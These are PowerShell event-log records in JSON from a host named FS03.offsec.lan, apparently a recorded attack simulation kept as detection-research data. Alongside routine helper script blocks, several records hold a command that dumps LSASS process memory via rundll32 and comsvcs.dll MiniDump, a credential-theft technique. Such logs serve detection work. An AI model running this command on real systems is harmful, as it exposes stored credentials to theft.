{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":600,"Level":4,"Task":6,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.000000Z"},"EventRecordID":126,"Channel":"Windows PowerShell","Computer":"FS03.offsec.lan","Security":null},"EventData":{"Data":{"#text":["Alias","Started","\tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=4.0\r\n\tHostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400\r\n\tHostApplication=powershell.exe -NoP -C C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine="]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":600,"Level":4,"Task":6,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.000000Z"},"EventRecordID":127,"Channel":"Windows PowerShell","Computer":"FS03.offsec.lan","Security":null},"EventData":{"Data":{"#text":["Environment","Started","\tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=4.0\r\n\tHostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400\r\n\tHostApplication=powershell.exe -NoP -C C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine="]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":600,"Level":4,"Task":6,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.000000Z"},"EventRecordID":128,"Channel":"Windows PowerShell","Computer":"FS03.offsec.lan","Security":null},"EventData":{"Data":{"#text":["FileSystem","Started","\tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=4.0\r\n\tHostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400\r\n\tHostApplication=powershell.exe -NoP -C C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine="]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":600,"Level":4,"Task":6,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.000000Z"},"EventRecordID":129,"Channel":"Windows PowerShell","Computer":"FS03.offsec.lan","Security":null},"EventData":{"Data":{"#text":["Function","Started","\tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=4.0\r\n\tHostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400\r\n\tHostApplication=powershell.exe -NoP -C C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine="]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":600,"Level":4,"Task":6,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.000000Z"},"EventRecordID":130,"Channel":"Windows PowerShell","Computer":"FS03.offsec.lan","Security":null},"EventData":{"Data":{"#text":["Registry","Started","\tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=4.0\r\n\tHostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400\r\n\tHostApplication=powershell.exe -NoP -C C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine="]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":600,"Level":4,"Task":6,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.000000Z"},"EventRecordID":131,"Channel":"Windows PowerShell","Computer":"FS03.offsec.lan","Security":null},"EventData":{"Data":{"#text":["Variable","Started","\tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=4.0\r\n\tHostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400\r\n\tHostApplication=powershell.exe -NoP -C C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine="]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":400,"Level":4,"Task":4,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.000000Z"},"EventRecordID":132,"Channel":"Windows PowerShell","Computer":"FS03.offsec.lan","Security":null},"EventData":{"Data":{"#text":["Available","None","\tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=4.0\r\n\tHostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400\r\n\tHostApplication=powershell.exe -NoP -C C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id\r\n\tEngineVersion=4.0\r\n\tRunspaceId=1668d864-c13c-442c-bf70-3fe6a4dee2ca\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine="]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":800,"Level":4,"Task":8,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.000000Z"},"EventRecordID":133,"Channel":"Windows PowerShell","Computer":"FS03.offsec.lan","Security":null},"EventData":{"Data":{"#text":["C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id","\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=15\r\n\r\n\tUserId=OFFSEC\\admmig\r\n\tHostName=ConsoleHost\r\n\tHostVersion=4.0\r\n\tHostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400\r\n\tHostApplication=powershell.exe -NoP -C C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id\r\n\tEngineVersion=4.0\r\n\tRunspaceId=1668d864-c13c-442c-bf70-3fe6a4dee2ca\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id","CommandInvocation(Get-Process): \"Get-Process\"\r\nParameterBinding(Get-Process): name=\"Name\"; value=\"lsass\"\r\n"]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":800,"Level":4,"Task":8,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.000000Z"},"EventRecordID":134,"Channel":"Windows PowerShell","Computer":"FS03.offsec.lan","Security":null},"EventData":{"Data":{"#text":["C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id","\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=17\r\n\r\n\tUserId=OFFSEC\\admmig\r\n\tHostName=ConsoleHost\r\n\tHostVersion=4.0\r\n\tHostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400\r\n\tHostApplication=powershell.exe -NoP -C C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id\r\n\tEngineVersion=4.0\r\n\tRunspaceId=1668d864-c13c-442c-bf70-3fe6a4dee2ca\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id","CommandInvocation(Get-Process): \"Get-Process\"\r\nParameterBinding(Get-Process): name=\"Name\"; value=\"rundll32\"\r\n"]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":40961,"Version":1,"Level":4,"Task":4,"Opcode":1,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.224590Z"},"EventRecordID":1285,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":null}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.224590Z"},"EventRecordID":1286,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"\"PS $($executionContext.SessionState.Path.CurrentLocation)$('>' * ($nestedPromptLevel + 1)) \"\n# .Link\n# http://go.microsoft.com/fwlink/?LinkID=225750\n# .ExternalHelp System.Management.Automation.dll-help.xml\n","ScriptBlockId":"f61a7fd0-2926-4ac5-bcd6-c6c3e886f23c"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.240215Z"},"EventRecordID":1287,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"\r\n<# Options include:\r\n     RelativeFilePaths - [bool]\r\n         Always resolve file paths using Resolve-Path -Relative.\r\n         The default is to use some heuristics to guess if relative or absolute is better.\r\n\r\n   To customize your own custom options, pass a hashtable to CompleteInput, e.g.\r\n         return [System.Management.Automation.CommandCompletion]::CompleteInput($inputScript, $cursorColumn,\r\n             @{ RelativeFilePaths=$false }\r\n#>\r\n\r\n[CmdletBinding(DefaultParameterSetName = 'ScriptInputSet')]\r\nParam(\r\n    [Parameter(ParameterSetName = 'ScriptInputSet', Mandatory = $true, Position = 0)]\r\n    [string] $inputScript,\r\n    \r\n    [Parameter(ParameterSetName = 'ScriptInputSet', Mandatory = $true, Position = 1)]\r\n    [int] $cursorColumn,\r\n\r\n    [Parameter(ParameterSetName = 'AstInputSet', Mandatory = $true, Position = 0)]\r\n    [System.Management.Automation.Language.Ast] $ast,\r\n\r\n    [Parameter(ParameterSetName = 'AstInputSet', Mandatory = $true, Position = 1)]\r\n    [System.Management.Automation.Language.Token[]] $tokens,\r\n\r\n    [Parameter(ParameterSetName = 'AstInputSet', Mandatory = $true, Position = 2)]\r\n    [System.Management.Automation.Language.IScriptPosition] $positionOfCursor,\r\n    \r\n    [Parameter(ParameterSetName = 'ScriptInputSet', Position = 2)]\r\n    [Parameter(ParameterSetName = 'AstInputSet', Position = 3)]\r\n    [Hashtable] $options = $null\r\n)\r\n\r\nEnd\r\n{\r\n    if ($psCmdlet.ParameterSetName -eq 'ScriptInputSet')\r\n    {\r\n        return [System.Management.Automation.CommandCompletion]::CompleteInput(\r\n            <#inputScript#>  $inputScript,\r\n            <#cursorColumn#> $cursorColumn,\r\n            <#options#>      $options)\r\n    }\r\n    else\r\n    {\r\n        return [System.Management.Automation.CommandCompletion]::CompleteInput(\r\n            <#ast#>              $ast,\r\n            <#tokens#>           $tokens,\r\n            <#positionOfCursor#> $positionOfCursor,\r\n            <#options#>          $options)\r\n    }\r\n}\r\n        ","ScriptBlockId":"66868ed0-c888-425b-94c3-df6c50632d81"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.240215Z"},"EventRecordID":1288,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$space = New-Object System.Management.Automation.Host.BufferCell\n$space.Character = ' '\n$space.ForegroundColor = $host.ui.rawui.ForegroundColor\n$space.BackgroundColor = $host.ui.rawui.BackgroundColor\n$rect = New-Object System.Management.Automation.Host.Rectangle\n$rect.Top = $rect.Bottom = $rect.Right = $rect.Left = -1\n$origin = New-Object System.Management.Automation.Host.Coordinates\n$Host.UI.RawUI.CursorPosition = $origin\n$Host.UI.RawUI.SetBufferContents($rect, $space)\n# .Link\n# http://go.microsoft.com/fwlink/?LinkID=225747\n# .ExternalHelp System.Management.Automation.dll-help.xml\n","ScriptBlockId":"348ad715-185a-49c1-9122-a75725a8282e"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.240215Z"},"EventRecordID":1289,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"param([string[]]$paths)\n\n$OutputEncoding = [System.Console]::OutputEncoding\n\nif($paths)\n{\n    foreach ($file in $paths)\n    {\n        Get-Content $file | more.com\n    }\n}\nelse\n{\n    $input | more.com\n}\n","ScriptBlockId":"d178e9eb-ea8d-43fe-97f5-bf3c74a028dd"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1290,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"\r\n<#\r\n.FORWARDHELPTARGETNAME Get-Help\r\n.FORWARDHELPCATEGORY Cmdlet\r\n#>\r\n[CmdletBinding(DefaultParameterSetName='AllUsersView', HelpUri='http://go.microsoft.com/fwlink/?LinkID=113316')]\r\nparam(\r\n    [Parameter(Position=0, ValueFromPipelineByPropertyName=$true)]\r\n    [string]\r\n    ${Name},\r\n\r\n    [string]\r\n    ${Path},\r\n\r\n    [ValidateSet('Alias','Cmdlet','Provider','General','FAQ','Glossary','HelpFile','ScriptCommand','Function','Filter','ExternalScript','All','DefaultHelp','Workflow')]\r\n    [string[]]\r\n    ${Category},\r\n\r\n    [string[]]\r\n    ${Component},\r\n\r\n    [string[]]\r\n    ${Functionality},\r\n\r\n    [string[]]\r\n    ${Role},\r\n\r\n    [Parameter(ParameterSetName='DetailedView', Mandatory=$true)]\r\n    [switch]\r\n    ${Detailed},\r\n\r\n    [Parameter(ParameterSetName='AllUsersView')]\r\n    [switch]\r\n    ${Full},\r\n\r\n    [Parameter(ParameterSetName='Examples', Mandatory=$true)]\r\n    [switch]\r\n    ${Examples},\r\n\r\n    [Parameter(ParameterSetName='Parameters', Mandatory=$true)]\r\n    [string]\r\n    ${Parameter},\r\n\r\n    [Parameter(ParameterSetName='Online', Mandatory=$true)]\r\n    [switch]\r\n    ${Online},\r\n\r\n    [Parameter(ParameterSetName='ShowWindow', Mandatory=$true)]\r\n    [switch]\r\n    ${ShowWindow})\r\n\r\n      #Set the outputencoding to Console::OutputEncoding. More.com doesn't work well with Unicode.\r\n      $outputEncoding=[System.Console]::OutputEncoding\r\n\r\n      Get-Help @PSBoundParameters | more\r\n","ScriptBlockId":"d5252597-b584-43d6-83da-069e7c04687f"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1291,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"\r\n<#\r\n.FORWARDHELPTARGETNAME New-Item\r\n.FORWARDHELPCATEGORY Cmdlet\r\n#>\r\n[CmdletBinding(DefaultParameterSetName='pathSet',\r\n    SupportsShouldProcess=$true,\r\n    SupportsTransactions=$true,\r\n    ConfirmImpact='Medium')]\r\n    [OutputType([System.IO.DirectoryInfo])]\r\nparam(\r\n    [Parameter(ParameterSetName='nameSet', Position=0, ValueFromPipelineByPropertyName=$true)]\r\n    [Parameter(ParameterSetName='pathSet', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)]\r\n    [System.String[]]\r\n    ${Path},\r\n\r\n    [Parameter(ParameterSetName='nameSet', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n    [AllowNull()]\r\n    [AllowEmptyString()]\r\n    [System.String]\r\n    ${Name},\r\n\r\n    [Parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]\r\n    [System.Object]\r\n    ${Value},\r\n\r\n    [Switch]\r\n    ${Force},\r\n\r\n    [Parameter(ValueFromPipelineByPropertyName=$true)]\r\n    [System.Management.Automation.PSCredential]\r\n    ${Credential}\r\n)\r\n\r\nbegin {\r\n\r\n    try {\r\n        $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('New-Item', [System.Management.Automation.CommandTypes]::Cmdlet)\r\n        $scriptCmd = {& $wrappedCmd -Type Directory @PSBoundParameters }\r\n        $steppablePipeline = $scriptCmd.GetSteppablePipeline()\r\n        $steppablePipeline.Begin($PSCmdlet)\r\n    } catch {\r\n        throw\r\n    }\r\n\r\n}\r\n\r\nprocess {\r\n\r\n    try {\r\n        $steppablePipeline.Process($_)\r\n    } catch {\r\n        throw\r\n    }\r\n\r\n}\r\n\r\nend {\r\n\r\n    try {\r\n        $steppablePipeline.End()\r\n    } catch {\r\n        throw\r\n    }\r\n\r\n}\r\n\r\n","ScriptBlockId":"224e56f3-14a2-4d10-9982-81d0d14a3851"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1292,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"\r\nparam(\r\n    [Parameter(ValueFromPipeline=$true)]\r\n    [string[]]\r\n    $verb = '*'\r\n)\r\nbegin {\r\n    $allVerbs = [PSObject].Assembly.GetTypes() |\r\n        Where-Object {$_.Name -match '^Verbs.'} |\r\n        Get-Member -type Properties -static |\r\n        Select-Object @{\r\n            Name='Verb'\r\n            Expression = {$_.Name}\r\n        }, @{\r\n            Name='Group'\r\n            Expression = {\r\n                $str = \"$($_.TypeName)\"\r\n                $str.Substring($str.LastIndexOf('Verbs') + 5)\r\n            }\r\n        }\r\n}\r\nprocess {\r\n    foreach ($v in $verb) {\r\n        $allVerbs | Where-Object { $_.Verb -like $v }\r\n    }\r\n}\r\n# .Link\r\n# http://go.microsoft.com/fwlink/?LinkID=160712\r\n# .ExternalHelp System.Management.Automation.dll-help.xml\r\n","ScriptBlockId":"78bfcb10-c68f-466a-8f92-8fa4504f4a1b"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1293,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"\r\n[CmdletBinding()]\r\nparam(\r\n    [ValidateRange(2, 2147483647)]\r\n    [int]\r\n    ${Width},\r\n\r\n    [Parameter(ValueFromPipeline=$true)]\r\n    [psobject]\r\n    ${InputObject})\r\n\r\nbegin\r\n{\r\n    try {\r\n        $PSBoundParameters['Stream'] = $true\r\n        $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('Out-String',[System.Management.Automation.CommandTypes]::Cmdlet)\r\n        $scriptCmd = {& $wrappedCmd @PSBoundParameters }\r\n        $steppablePipeline = $scriptCmd.GetSteppablePipeline($myInvocation.CommandOrigin)\r\n        $steppablePipeline.Begin($PSCmdlet)\r\n    } catch {\r\n        throw\r\n    }\r\n}\r\n\r\nprocess\r\n{\r\n    try {\r\n        $steppablePipeline.Process($_)\r\n    } catch {\r\n        throw\r\n    }\r\n}\r\n\r\nend\r\n{\r\n    try {\r\n        $steppablePipeline.End()\r\n    } catch {\r\n        throw\r\n    }\r\n}\r\n<#\r\n.ForwardHelpTargetName Out-String\r\n.ForwardHelpCategory Cmdlet\r\n#>\r\n","ScriptBlockId":"ed0d1dfc-abc8-443c-bb7a-d04089c79523"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1294,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location A:","ScriptBlockId":"a7a8ac6e-44e9-4f59-8bac-08f6723bb96c"}}}
